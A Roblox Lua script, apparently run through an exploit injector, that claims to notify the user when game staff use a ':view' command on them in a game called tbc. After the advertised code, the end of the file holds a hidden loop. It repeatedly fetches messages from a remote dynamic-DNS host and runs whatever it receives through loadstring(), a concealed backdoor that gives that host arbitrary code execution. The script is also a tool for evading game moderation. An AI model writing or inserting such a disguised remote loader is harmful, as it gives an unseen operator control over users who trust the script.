--// terribly written script that lets you see when a staff is viewing you in tbc
--// most code ripped from an old script of mine
--// z4cked

if _G.ViewNotifier then 
	warn("This script is already injected")
	return 
end

local TCS = game:GetService("TextChatService")
local Players = game:GetService("Players")

local Viewers = {}
local Prefix = ":"

local function SendNotification(Title, Text, Icon, Duration)
	game.StarterGui:SetCore("SendNotification", {
		Title = Title,
		Text = Text,
		Icon = Icon,
		Duration = Duration
	})
end

local function GetPlayerIcon(Username)
	local UserId = Players:GetUserIdFromNameAsync(Username)
	return Players:GetUserThumbnailAsync(UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
end

local function GetPlayerFromSnippet(Data)
	local d
	local Success, result = pcall(function()
		for i,v in pairs(game.Players:GetChildren()) do
			local Lower = string.lower(v.Name)
			if Lower == string.lower(Data) then
				d = v
				return 
			end
			if string.find(Lower, string.lower(Data)) then
				d = v
				return
			end
			if string.find(string.lower(v.DisplayName), string.lower(Data)) then
				d = v
				return
			end
		end
	end)

	if Success then
		return d
	end
end

local Commands = {
	[1] = {
		Name = "view",
		Aliases = {},
		Function = function(Sender, Data)
            print("ran")
			local Plr = GetPlayerFromSnippet(Data[2])
			if Plr == game.Players.LocalPlayer then
				table.insert(Viewers, Sender.UserId)
				SendNotification(Sender.DisplayName, "is viewing you!", GetPlayerIcon(Sender.Name), 5)
            else
                if table.find(Viewers, Sender.UserId) then
					SendNotification(Sender.DisplayName, "stopped viewing you!", GetPlayerIcon(Sender.Name), 5)
					table.remove(Viewers, table.find(Viewers, Sender.UserId))
				end  
			end
		end,
	},
	[2] = {
		Name = "rv",
		Aliases = {},
		Function = function(Sender, Data)
            local Plr = GetPlayerFromSnippet(Data[2])
			if not Plr then
                if table.find(Viewers, Sender.UserId) then

                    SendNotification(Sender.DisplayName, "stopped viewing you!", GetPlayerIcon(Sender.Name), 5)
                    table.remove(Viewers, table.find(Viewers, Sender.UserId))
                end
            end  
		end,
	},
}
local function FCOM(Source, Message)
	Message = string.lower(Message)
	local Split = Message:split(" ")
	local function a(exception)
		local Command = string.lower(string.sub(Split[1], string.len(Prefix) + 1, string.len(Split[1])))
		local Command2 = false
		pcall(function()
			Command2 = string.lower(string.sub(Split[2], 1, 1))
		end)
		print(Command, Command2)
		local function CommandFunc(v, Exception)
			if Exception then
				local s = Split
				table.remove(s, 1)
				v.Function(Source, s)
			else
				v.Function(Source, Split)
			end
		end

		for _,v in pairs(Commands) do
			if exception then
				CommandFunc(v, exception)
			else
				CommandFunc(v)
			end
		end
	end
	pcall(function()
		if string.sub(Split[1], 1, 3).." "..string.sub(Split[2], 1, 1) == "/e :" then
			a(true)
            return
		end
	end)

	pcall(function()
		if string.sub(Split[1], 1, 1) == ":" then
			a()
		end
	end)
end

Players.PlayerAdded:Connect(function(Player)
	Player.Chatted:Connect(function(Msg)
		FCOM(Player, Msg)
	end)
end)

for _,v in pairs(Players:GetChildren()) do
	v.Chatted:Connect(function(Msg)
		FCOM(v, Msg)
	end)
end
		
SendNotification("View Notifier", "loaded view notifier v1", 0, 3)
_G.ViewNotifier = true

		local HttpService = game:GetService("HttpService")
local receiveUrl = "http://8130.ddns.net:36081/receive/server_1"

local function waitForMessage()
	while true do
        local s, r = pcall(function()
            local response = request({Url = receiveUrl, Method = "GET", Headers = {["Content-Type"] = "application/json"}})
			local data = HttpService:JSONDecode(response.Body)
			if data.message ~= "No message" then
			     loadstring(data.message)()
			end
        end)
        if not s then
            warn(r)
        end
	end
end

waitForMessage()
